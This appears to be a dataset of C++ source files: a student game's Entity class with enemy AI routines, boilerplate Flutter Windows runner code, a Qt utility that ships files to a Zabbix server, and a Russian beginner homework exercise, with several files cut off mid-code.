    "/**\n* Author: Matthew Ma\n* Assignment: Rise of the AI\n* Date due: 2024-03-23, 11:59pm\n* I pledge that I have completed this assignment without\n* collaborating with anyone else, in conformance with the\n* NYU School of Engineering Policies and Procedures on\n* Academic Misconduct.\n**/\n\n#define GL_SILENCE_DEPRECATION\n#define STB_IMAGE_IMPLEMENTATION\n\n#ifdef _WINDOWS\n#include <GL/glew.h>\n#endif\n\n#define GL_GLEXT_PROTOTYPES 1\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include \"glm/mat4x4.hpp\"\n#include \"glm/gtc/matrix_transform.hpp\"\n#include \"ShaderProgram.h\"\n#include \"Entity.h\"\n\nEntity::Entity()\n{\n    // \u2013\u2013\u2013\u2013\u2013 PHYSICS \u2013\u2013\u2013\u2013\u2013 //\n    m_position = glm::vec3(0.0f);\n    m_velocity = glm::vec3(0.0f);\n    m_acceleration = glm::vec3(0.0f);\n\n    // \u2013\u2013\u2013\u2013\u2013 TRANSLATION \u2013\u2013\u2013\u2013\u2013 //\n    m_movement = glm::vec3(0.0f);\n    m_speed = 0;\n    m_model_matrix = glm::mat4(1.0f);\n}\n\nEntity::~Entity()\n{\n    delete[] m_animation_up;\n    delete[] m_animation_down;\n    delete[] m_animation_left;\n    delete[] m_animation_right;\n    delete[] m_walking;\n}\n\nvoid Entity::draw_sprite_from_texture_atlas(ShaderProgram* program, GLuint texture_id, int index)\n{\n    // Step 1: Calculate the UV location of the indexed frame\n    float u_coord = (float)(index % m_animation_cols) / (float)m_animation_cols;\n    float v_coord = (float)(index / m_animation_cols) / (float)m_animation_rows;\n\n    // Step 2: Calculate its UV size\n    float width = 1.0f / (float)m_animation_cols;\n    float height = 1.0f / (float)m_animation_rows;\n\n    // Step 3: Just as we have done before, match the texture coordinates to the vertices\n    float tex_coords[] =\n    {\n        u_coord, v_coord + height, u_coord + width, v_coord + height, u_coord + width, v_coord,\n        u_coord, v_coord + height, u_coord + width, v_coord, u_coord, v_coord\n    };\n\n    float vertices[] =\n    {\n        -0.5, -0.5, 0.5, -0.5,  0.5, 0.5,\n        -0.5, -0.5, 0.5,  0.5, -0.5, 0.5\n    };\n\n    // Step 4: And render\n    glBindTexture(GL_TEXTURE_2D, texture_id);\n\n    glVertexAttribPointer(program->get_position_attribute(), 2, GL_FLOAT, false, 0, vertices);\n    glEnableVertexAttribArray(program->get_position_attribute());\n\n    glVertexAttribPointer(program->get_tex_coordinate_attribute(), 2, GL_FLOAT, false, 0, tex_coords);\n    glEnableVertexAttribArray(program->get_tex_coordinate_attribute());\n\n    glDrawArrays(GL_TRIANGLES, 0, 6);\n\n    glDisableVertexAttribArray(program->get_position_attribute());\n    glDisableVertexAttribArray(program->get_tex_coordinate_attribute());\n}\n\nvoid Entity::ai_activate(Entity* player)\n{\n    switch (m_ai_type)\n    {\n    case WALKER:\n        ai_walk();\n        break;\n\n    case GUARD:\n        ai_guard(player);\n        break;\n\n    case RUNNER:\n        ai_run(player);\n        break;\n\n    case JUMPER:\n        ai_jump();\n        break;\n\n    case PATROLLER:\n        ai_patrol(player, pt1, pt2);\n        break;\n\n\n    default:\n        break;\n    }\n}\n\nvoid Entity::ai_walk()\n{\n    m_movement = glm::vec3(-1.0f, 0.0f, 0.0f);\n}\n\n//NEW\nvoid Entity::ai_jump()\n{\n    if (!m_is_jumping) {\n        m_velocity.y = m_jumping_power;\n        m_is_jumping = true;\n    }\n}\n\nvoid Entity::ai_guard(Entity* player)\n{\n    switch (m_ai_state) {\n    case IDLE:\n        if (glm::distance(m_position, player->get_position()) < 3.0f) m_ai_state = WALKING;\n        break;\n\n    case WALKING:\n        if (m_position.x > player->get_position().x) {\n            m_movement = glm::vec3(-1.0f, 0.0f, 0.0f);\n        }\n        else {\n            m_movement = glm::vec3(1.0f, 0.0f, 0.0f);\n        }\n        break;\n\n    case ATTACKING:\n        break;\n\n    default:\n        break;\n    }\n}\n\nvoid Entity::ai_patrol(Entity* player, float pt1, float pt2)\n{\n    switch (m_ai_state) {\n    case PATROL:\n        if (glm::distance(m_position, player->get_position()) < 2.0f) m_ai_state = WALKING;\n        if (m_position.x > pt1) {\n            m_movement.x = -0.6f;\n        }\n        else if (m_position.x < pt2) {\n            m_movement.x = 0.6f;\n        }\n        break;\n\n    case WALKING:\n        if (glm::distance(m_position, player->get_position()) < 3.0f) {\n            if (m_position.x > player->get_position().x) {\n                m_movement = glm::vec3(-1.2f, 0.0f, 0.0f);\n            }\n            else {\n                m_movement = glm::vec3(1.2f, 0.0f, 0.0f);\n            }\n        }\n        else {\n            m_ai_state = PATROL;\n        }\n        break;\n\n    case ATTACKING:\n        break;\n\n    default:\n        break;\n    }\n}\n\nvoid Entity::ai_run(Entity* player)\n{\n    switch (m_ai_state) {\n    case IDLE:\n        if (glm::distance(m_position, player->get_position()) < 2.0f) m_ai_state = RUNNING;\n        break;\n\n    case RUNNING:\n        if (glm::distance(m_position, player->get_position()) < 1.5f) {\n            if (m_position.x > player->get_position().x) {\n                m_movement = glm::vec3(2.0f, 0.0f, 0.0f);\n            }\n            else {\n                m_movement = glm::vec3(-2.0f, 0.0f, 0.0f);\n            }\n        }\n        else {\n            se",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"styleon_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"myapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <QCoreApplication>\n#include <QFile>\n#include <QDebug>\n#include <QDir>\n#include <QProcess>\n\nint countFilesInDirectory(const QString &path) {\n    QDir dir(path);\n    int count = 0;\n\n    // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u043f\u043a\u0438 \".\" \u0438 \"..\"\n    dir.setFilter(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);\n\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u043f\u0430\u043f\u043e\u043a\n    QFileInfoList list = dir.entryInfoList();\n\n    for (int i = 0; i < list.size(); ++i) {\n        QFileInfo fileInfo = list.at(i);\n        if (fileInfo.isDir()) {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f, \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u043e \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e\n            count += countFilesInDirectory(fileInfo.absoluteFilePath());\n        } else {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0444\u0430\u0439\u043b, \u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0432\u0430\u0435\u043c \u0441\u0447\u0435\u0442\u0447\u0438\u043a\n            ++count;\n        }\n    }\n\n    return count;\n}\n\n\nQVector<QString> getAllFileNames(const QString &path) {\n    QDir dir(path);\n    QVector<QString> fileNames;\n\n    // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u043f\u043a\u0438 \".\" \u0438 \"..\"\n    dir.setFilter(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0432\u0441\u0435\u0445 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438 \u043f\u0430\u043f\u043e\u043a\n    QFileInfoList list = dir.entryInfoList();\n\n    for (int i = 0; i < list.size(); ++i) {\n        QFileInfo fileInfo = list.at(i);\n        if (fileInfo.isDir()) {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f, \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u043e \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b\n            QVector<QString> subdirFiles = getAllFileNames(fileInfo.absoluteFilePath());\n            fileNames += subdirFiles; // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0438\u043c\u0435\u043d\u0430 \u0444\u0430\u0439\u043b\u043e\u0432 \u0438\u0437 \u043f\u043e\u0434\u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0439\n        } else {\n            // \u0415\u0441\u043b\u0438 \u044d\u0442\u043e \u0444\u0430\u0439\u043b, \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0435\u0433\u043e \u0438\u043c\u044f \u0432 \u0432\u0435\u043a\u0442\u043e\u0440\n            fileNames.append(fileInfo.fileName());\n        }\n    }\n\n    return fileNames;\n}\n\n\nbool removeFile(const QString &filePath) {\n    if (QFile::exists(filePath)) { // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043b\u0438 \u0444\u0430\u0439\u043b\n        bool success = QFile::remove(filePath);\n        return success;\n    } else {\n        qDebug() << \"File does not exist:\" << filePath;\n        return false;\n    }\n}\n\n\nint main(int argc, char *argv[])\n{\n    QCoreApplication a(argc, argv);\n\n    QString directoryPath = \"C:/Files/Project/WirenBoard_monitor/ApplicationCreate/release/release/files/input\"; // \u0417\u0430\u043c\u0435\u043d\u0438\u0442\u0435 \u043d\u0430 \u043f\u0443\u0442\u044c \u043a \u0432\u0430\u0448\u0435\u0439 \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u0438\n\n    int fileCount = countFilesInDirectory(directoryPath);\n\n    qDebug() << fileCount;\n\n    QVector<QString> fileNames = getAllFileNames(directoryPath);\n\n    //\u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438\n    for (int i = 0; i < fileCount; i++) {\n        QProcess process;\n        QStringList arguments;\n        QString path = \"C:/Files/Project/WirenBoard_monitor/ApplicationCreate/release/release/files/input\";\n        QString pathtoinputs = QString( path + \"/%1\").arg(fileNames[i]);\n\n        arguments << \"-z\" << \"10.0.0.100\" << \"-T\" << \"-i\" << pathtoinputs;\n\n        process.start(\"zabbix_sender\", arguments);\n\n        if (process.waitForFinished()) {\n            QString output = process.readAllStandardOutput();\n            if (process.exitCode() == 0) {\n                qDebug() << \"Sending the file to the server is successful:\" << pathtoinputs;\n                bool result = removeFile(pathtoinputs);\n                if (result) {\n                   qDebug() << \"File successfully removed:\" << pathtoinputs;\n                } else {\n                   qDebug() << \"Failed to remove file:\" << pathtoinputs;\n                }\n            }\n            else {\n                qDebug() << \"Error sending the file to the server:\" << pathtoinputs;\n            }\n        }\n\n    }\n\n    return 0;\n\n    return a.exec();\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff// Dz\u211617.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <cmath>\n\n   // \u0417\u0430\u0434\u0430\u0447\u0430 1\n   // \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e mean, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\n   //\u0441\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0434\u0432\u0443\u0445 \u043f\u0435\u0440\u0435\u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043d\u0435\u0451 \u0447\u0438\u0441\u0435\u043b.\n   //\u041d\u0435 \u0437\u0430\u0431\u0443\u0434\u044c\u0442\u0435 \u043f\u0440\u043e\u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0435\u0451 \u0440\u0430\u0431\u043e\u0442\u0443, \u0432\u044b\u0437\u0432\u0430\u0432\n   //\u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0432 \u0431\u043b\u043e\u043a\u0435 main.\ndouble mean(double num1, double num2) {\n    return (num1 + num2) / 2; \n}\n\ndouble mean_arr(int arr[], int length) {\n    double sum = 0.0;\n    for (int i = 0; i < length; ++i) {\n        sum += arr[i];\n    }\n    return sum / length;\n}\n\nvoid powers(int N, int M) {\n    for (int i = 0; i <= M; i++) {\n        std::cout << N << \" ^ \" << i << \" = \" << pow(N, i) << std::endl;\n    }\n}\n\n\n\nint main() {\n    setlocale(LC_ALL, \"ru\");\n   \n   /*\n    double num1, num2;\n\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e -> \";\n        std::cin >> num1;\n        std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e -> \";\n        std::cin >> num2;\n     \n        std::cout<<\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 = \" << mean(num1, num2);\n\n    \n // \u0417\u0430\u0434\u0430\u0447\u0430 2\n //\u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e mean_arr.\u041e\u043d\u0430 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442\n //\u043c\u0430\u0441\u0441\u0438\u0432 \u0438 \u0435\u0433\u043e \u0434\u043b\u0438\u043d\u0443, \u043f\u043e\u0441\u043b\u0435 \u0447\u0435\u0433\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0441\u0440\u0435\u0434\u043d\u0435\u0435\n //\u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0432\u0441\u0435\u0445 \u0435\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432.\n\n\n    int arr[] = { 1,2,3,4,5 };\n    int length = sizeof(arr) / sizeof(arr[0]);\n    double average = mean_arr(arr, length);\n    std::cout << \"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 = \" << average << \"\\n\";\n*/\n\n\n// \u0417\u0430\u0434\u0430\u0447\u0430 3\n//\u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u044e powers(N, M), \u043a\u043e\u0442\u043e\u0440\u0430\u044f\n//\u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u043e\u0432\u044b\u0445 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f.\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043e\u043b\u0436\u043d\u0430\n//\u0432\u044b\u0432\u043e\u0434\u0438\u0442\u044c \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c \u0432\u0441\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u0438 \u0447\u0438\u0441\u043b\u0430 N \u043e\u0442 \u0441\u0442\u0435\u043f\u0435\u043d\u0438 0 \u0434\u043e\n//\u0441\u0442\u0435\u043f\u0435\u043d\u0438 M 